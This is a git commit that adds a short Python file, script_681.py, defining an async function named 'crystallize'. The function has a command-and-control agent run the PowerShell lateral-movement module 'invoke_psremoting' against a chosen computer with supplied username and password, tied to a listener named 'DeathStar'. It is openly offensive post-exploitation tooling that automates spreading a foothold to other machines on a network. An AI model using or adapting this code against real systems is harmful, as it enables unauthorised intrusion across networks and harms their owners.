91c5f8a1ac5e02eb02dadb417a91924d7d87f586
developersl-vihaga <githubdevelopersl@gmail.com>
2025-05-07 01:52:48 +0530

    Upload script_681.py

---
+++ script_681.py
@@ -0,0 +1,15 @@
+async def crystallize(
+    agent, computer_name, username="", password="", listener="DeathStar"
+):
+    output = await agent.execute(
+        "powershell/lateral_movement/invoke_psremoting",
+        options={
+            "ComputerName": computer_name,
+            "Listener": listener,
+            "UserName": username,
+            "Password": password,
+        },
+    )
+    results = output["results"].strip()
+    log.debug(results)
+    return results
